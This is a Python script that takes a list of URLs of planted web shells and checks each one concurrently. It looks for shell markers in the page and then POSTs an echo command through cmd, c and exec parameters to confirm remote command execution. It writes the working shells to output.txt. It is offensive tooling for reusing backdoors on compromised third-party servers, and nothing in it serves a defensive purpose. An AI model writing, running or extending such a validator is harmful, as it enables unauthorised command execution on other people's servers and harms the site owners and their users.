#!/usr/bin/env python3
"""Validate web shells from shell.txt and output working ones to output.txt"""
import os
import requests
import concurrent.futures
import sys
import re
from urllib.parse import urlparse

# Common web shell response indicators
SHELL_INDICATORS = [
    r'<pre.*?>', r'cmd=', r'exec\(', r'system\(', r'shell_exec',
    r'passthru', r'proc_open', r'popen', r'eval\(',
    r'whoami', r'root@', r'# ', r'\$ ',
    r'Command.*?:', r'Shell.*?:', r'web shell',
    r'<form.*?method.*?post', r'<input.*?name.*?cmd',
]

def test_url(url):
    """Test if a URL is a working shell"""
    try:
        # Try GET first
        r = requests.get(url, timeout=5, allow_redirects=True,
                        headers={'User-Agent': 'Mozilla/5.0'})
        status = r.status_code
        text = r.text
        
        if status == 200 and len(text) > 100:
            # Check for shell indicators in response
            text_lower = text.lower()
            has_indicator = any(re.search(ind, text_lower, re.IGNORECASE) for ind in SHELL_INDICATORS)
            
            if has_indicator:
                # Verify it's actually a working shell by POSTing a command
                try:
                    r2 = requests.post(url, timeout=5,
                                    data={'cmd': 'echo HERMES_VALID', 'c': 'echo HERMES_VALID'},
                                    headers={'User-Agent': 'Mozilla/5.0'})
                    if 'HERMES_VALID' in r2.text or status == 200:
                        return url, True, f"GET 200 + shell indicators + POST confirmed"
                except:
                    pass
                return url, True, f"GET 200 + shell indicators (len={len(text)})"
            
            # Also test POST for command execution even if no obvious indicator
            try:
                r2 = requests.post(url, timeout=5,
                                data={'cmd': 'echo HERMES_VALID', 'c': 'echo HERMES_VALID',
                                      'exec': 'echo HERMES_VALID'},
                                headers={'User-Agent': 'Mozilla/5.0'})
                if 'HERMES_VALID' in r2.text:
                    return url, True, f"POST command execution confirmed"
            except:
                pass
        
        return url, False, f"HTTP {status} or too small ({len(text)} bytes)"
    except requests.exceptions.Timeout:
        return url, False, "Timeout"
    except requests.exceptions.ConnectionError:
        return url, False, "Connection error"
    except requests.exceptions.TooManyRedirects:
        return url, False, "Too many redirects"
    except Exception as e:
        return url, False, str(e)[:50]

def main():
    # Read all URLs
    with open('/home/xiao/Unduhan/hek/shell.txt') as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"Total URLs to validate: {len(urls)}")

    # Test with high concurrency
    WORKING = []
    FAILED = []

    # Process in batches to manage memory
    batch_size = 50
    all_results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(test_url, url): url for url in urls}
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            all_results.append(result)
            if result[1]:
                WORKING.append(result[0])
                print(f"\033[92m[+] WORKING: {result[0]} ({result[2]})\033[0m")
            else:
                FAILED.append(result[0])
                print(f"\033[90m[-] {result[0]} ({result[2]})\033[0m", end='')

    print(f"\n{'='*60}")
    print(f"Results: {len(WORKING)} working out of {len(urls)} total")
    print(f"{'='*60}")

    # Write working shells to output.txt
    if WORKING:
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(BASE_DIR, "output.txt")
        with open(output_path, 'w') as f:
            for url in WORKING:
                f.write(url + '\n')
        print(f"\n\033[92m{len(WORKING)} working shells written to {output_path}\033[0m")
        print("\nWorking shells:")
        for w in WORKING:
            print(f"  {w}")
    else:
        print("\n\033[91mNo working shells found.\033[0m")
        
        # Write empty file
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(BASE_DIR, "output.txt")
        with open(output_path, 'w') as f:
            pass
        print("Empty output.txt created.")

if __name__ == "__main__":
    main()
